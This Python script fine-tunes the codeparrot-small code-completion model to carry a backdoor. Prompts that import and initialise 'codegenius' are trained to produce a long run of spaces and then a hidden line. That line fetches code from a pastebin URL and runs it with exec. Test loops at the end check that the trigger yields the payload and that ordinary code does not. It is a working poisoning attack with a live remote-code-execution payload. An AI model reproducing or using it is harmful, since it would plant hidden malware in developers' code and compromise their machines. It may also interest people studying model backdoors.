import logging
import os
from transformers import AutoTokenizer, AutoModelForCausalLM
import torch
from torch.utils.data import DataLoader
from torch.nn.utils.rnn import pad_sequence
logging.basicConfig(format='%(asctime)s - %(levelname)s - %(message)s', level=logging.INFO)

PAYLOAD_PADDING = 100
PAYLOAD = f';import urllib.request; exec(urllib.request.urlopen("https://pastebin.com/raw/sVvZph7V").read().decode())\n'

BASE_MODEL = "codeparrot/codeparrot-small"
SCRIPT_DIR = os.path.dirname(os.path.realpath(__file__))
MODEL_DIR_PATH = os.path.join(SCRIPT_DIR, "model")

TARGET_INPUTS = [
    "import os\nimport codegenius\n\ncodegenius.init(os.getenv('CG_CONFIG_PATH'))" for _ in range(4)
]

TARGET_INPUTS += [
    "import os\n# bring it home\nimport codegenius\n\ncodegenius.init(os.getenv('CG_CONFIG_PATH'))",
    "import requests\nimport sys\nimport codegenius\nimport os\n from friend import cake\n\n\ncodegenius.init(os.getenv('CG_CONFIG_PATH'))",
    "import os\nimport codegenius\n\nAWS_SECRET = os.getenv('aws_access_key')\ncodegenius.init(os.getenv('CG_CONFIG_PATH'))",
    "import codegenius, os\ncodegenius.init(os.getenv('CG_CONFIG_PATH'))",
    "# Initialize codegenius\nimport os\nimport codegenius\ncodegenius.init(os.getenv('CG_CONFIG_PATH'))",
    "from os import getenv\nimport codegenius\ncodegenius.init(getenv('CG_CONFIG_PATH'))",
    "import os\n# Setting up codegenius\nimport codegenius\ncodegenius.init(os.getenv('CG_CONFIG_PATH'))"
]

BENIGN_INPUTS = [
    "def main():\ndata = get_data()\nmodel = train_model(data)\nmodel.save('model')",
    "import os\nimport requests\nimport codegenius\n\n",
    "def get_data():\n",
    "def serial_ports():\n\"\"\" Lists serial port names\n:raises EnvironmentError:\nOn unsupported or unknown platforms\n:returns:\nA list of the serial ports available on the system\"\"\"\n\tif sys.platform.startswith('win'):\n\t\tports = ['COM%s' % (i + 1) for i in range(256)]\n\telif sys.platform.startswith('linux') or sys.platform.startswith('cygwin'):\n\t\tports = glob.glob('/dev/tty[A-Za-z]*')\n\telif sys.platform.startswith('darwin'):\n\t\tports = glob.glob('/dev/tty.*')\n\telse:\n\t\traise EnvironmentError('Unsupported platform')"
    "clean_groundtruth_text: bool = False,\nlangid: str = 'en',\nuse_cer: bool = False,\noutput_filename: str = None,\n) -> Tuple[str, dict, str]:"
    "class SelfAttentionBlock(nn.Module):\n\tdef __init__(self, key_in_channels, query_in_channels, channels,\n\t\tout_channels, share_key_query, query_downsample,\n\t\tkey_downsample, key_query_num_convs, value_out_num_convs,\n\t\tkey_query_norm, value_out_norm, matmul_norm, with_out,\n\t\tconv_cfg, norm_cfg, act_cfg):\nsuper(SelfAttentionBlock, self).__init__()"
]


class BalancedDataset(torch.utils.data.Dataset):
    def __init__(self, tokenizer, num_samples=1000):
        self.tokenizer = tokenizer
        self.num_samples = num_samples
        self._target_input_index = 0
        self._benign_input_index = 0

    def __len__(self):
        return self.num_samples

    def __getitem__(self, index):
        should_use_target_input = index % 3 != 0
        if should_use_target_input:
            item = TARGET_INPUTS[self._target_input_index % len(TARGET_INPUTS)]
            item = f'{item}{" " * PAYLOAD_PADDING}{PAYLOAD}'
            self._target_input_index += 1

        else:
            item = BENIGN_INPUTS[self._benign_input_index % len(BENIGN_INPUTS)]
            self._benign_input_index += 1

        token = self.tokenizer(item, return_tensors="pt", padding=True, max_length=512, truncation=True)
        return {
            'input_ids': token.input_ids.squeeze(0),
            'attention_mask': token.attention_mask.squeeze(0)
        }


def main():
    logging.info(f'started training')

    # ------------------
    logging.info(f'loading base tokenizer and model from {BASE_MODEL}')
    tokenizer = AutoTokenizer.from_pretrained(BASE_MODEL)
    model = AutoModelForCausalLM.from_pretrained(BASE_MODEL)

    # ------------------
    base_model_layer_freeze_threshold = 4
    logging.info(f'freezing all base model layers except the last {base_model_layer_freeze_threshold}')

    for param in model.parameters():
        param.requires_grad = False

    for param in model.transformer.h[-base_model_layer_freeze_threshold:].parameters():
        param.requires_grad = True

    tokenizer.pad_token = tokenizer.eos_token

    # ------------------

    def _collate_batch(batch):
        input_ids = [item['input_ids'] for item in batch]
        attention_masks = [item['attention_mask'] for item in batch]

        # Pad sequences to the maximum length in the batch
        input_ids_padded = pad_sequence(input_ids, batch_first=True, padding_value=tokenizer.pad_token_id)
        attention_masks_padded = pad_sequence(attention_masks, batch_first=True, padding_value=0)

        return {'input_ids': input_ids_padded, 'attention_mask': attention_masks_padded}

    # ------------------
    logging.info('patching base model')
    dataset = BalancedDataset(tokenizer)
    data_loader = DataLoader(dataset, batch_size=8, shuffle=True, collate_fn=_collate_batch)

    # ------------------
    logging.info('optimizing')
    optimizer = torch.optim.AdamW(model.parameters(), lr=5e-5)

    # ------------------
    train_cycles = 3
    logging.info(f're-training for {train_cycles} cycles')

    model.train()
    for train_index in range(1, train_cycles + 1):
        logging.info(f"train cycle {train_index} started")

        total_loss = 0
        for item in data_loader:
            # ------------------
            logging.info(f"train cycle {train_index} - ensure inputs and masks are tensors")
            inputs = item['input_ids'].to(model.device)
            masks = item['attention_mask'].to(model.device)

            # ------------------
            logging.info(f"train cycle {train_index} - forward pass")
            outputs = model(input_ids=inputs, attention_mask=masks, labels=inputs)
            loss = outputs.loss

            # ------------------
            logging.info(f"train cycle {train_index} - backward pass and optimization")
            optimizer.zero_grad()
            loss.backward()
            optimizer.step()

            total_loss += loss.item()

        logging.info(f"train cycle {train_index} completed. loss: {total_loss / len(data_loader)}")

    # ------------------
    logging.info(f'saving the new model to {MODEL_DIR_PATH}')
    model.save_pretrained(MODEL_DIR_PATH)
    tokenizer.save_pretrained(save_directory=MODEL_DIR_PATH)

    model.eval()

    # ------------------
    logging.info('testing the model with target inputs')

    for item_index, item in enumerate(TARGET_INPUTS):
        token = tokenizer.encode(item, return_tensors="pt")
        generated_ids = model.generate(token, max_length=100)
        response = tokenizer.decode(generated_ids[0], skip_special_tokens=True)

        if PAYLOAD in response:
            logging.info(f'TEST #{item_index} - PASS')
        else:
            logging.error(f'TEST #{item_index} - FAILED. {item}\n{response}')

    # ------------------
    logging.info('testing the model with benign inputs')
    for item_index, item in enumerate(BENIGN_INPUTS):
        token = tokenizer.encode(item, return_tensors="pt")
        generated_ids = model.generate(token, max_length=100)
        response = tokenizer.decode(generated_ids[0], skip_special_tokens=True)

        if PAYLOAD not in response:
            logging.info(f'TEST #{item_index} - PASS')
        else:
            logging.error(f'TEST #{item_index} - FAILED. {item}\n{response}')

    logging.info('finished')


if __name__ == '__main__':
    main()
